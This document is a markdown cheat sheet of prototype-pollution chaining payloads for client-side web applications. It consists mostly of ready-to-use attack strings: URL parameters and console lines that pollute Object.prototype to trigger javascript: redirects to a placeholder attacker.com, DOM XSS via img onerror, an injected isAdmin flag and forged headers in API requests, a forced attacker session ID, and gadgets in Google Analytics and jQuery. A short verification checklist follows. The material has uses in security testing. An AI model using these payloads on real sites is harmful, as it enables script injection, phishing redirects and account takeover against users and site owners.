# 🧪 Manual Chaining Payloads
**Escalate Prototype Pollution to High Impact (XSS, RCE, Account Takeover)**

## 1. 🔗 Gadget: `localtion.href` (Open Redirect / XSS)
If the application uses `location.href` assignement where the source is undefined.

**Payloads (Console/URL):**
```javascript
// URL param
?__proto__[href]=javascript:alert(1)
?__proto__[url]=javascript:alert(1)

// Console
Object.prototype.href = "javascript:alert(1)";
Object.prototype.url = "https://attacker.com";
```
**Impact:** 
- Open Redirect to standard phishing page
- JS execution if scheme is not validated

---

## 2. 🔗 Gadget: `document.write` / `innerHTML` (Dom XSS)
Common in analytics scripts or dynamic content loaders.

**Payloads:**
```javascript
// Inject script tag
?__proto__[src]=data:,alert(1)
?__proto__[html]=<img src=x onerror=alert(1)>

// Specific for some libraries
Object.prototype.HTML = "<img src=x onerror=alert(1)>"
```

---

## 3. 🔗 Gadget: `fetch` / `axios` (API Abuse / CSRF)
Polluting headers or body of API requests.

**Payloads:**
```javascript
// Add malicious header
Object.prototype.headers = { "x-hacked": "true" };

// Change content type to bypass checks
Object.prototype["content-type"] = "application/x-www-form-urlencoded";

// Pollute body (if JSON is constructed from object)
Object.prototype.isAdmin = true;
```

---

## 4. 🔗 Gadget: `localStorage` / `sessionStorage` (DoS / Persistence)
Polluting keys used for storage logic.

**Payloads:**
```javascript
// Clear storage on load (DoS)
Object.prototype.clear = true;

// Force specific user session ID
Object.prototype.sessionId = "attacker-session-id";
```

---

## 5. 🔗 Library Specific Gadgets

### **Google Analytics / GTM**
- `hitCallback`: Execute code when tracking runs.
```javascript
?__proto__[hitCallback]=alert(1)
```

### **jQuery**
- `context`: Control where selector search begins.
```javascript
?__proto__[context]=<img src=x onerror=alert(1)>
```

---

## 🎯 Verification Checklist for confirmed PP
1.  [ ] Inject property: `Object.prototype.foo = "bar"`
2.  [ ] Check if persistent: Reload page, check `window.foo`
3.  [ ] If not persistent, check URL reflection.
4.  [ ] **Gadget Hunt**: Look for `undefined` properties being assigned or used in critical sinks (`href`, `eval`, `innerHTML`).
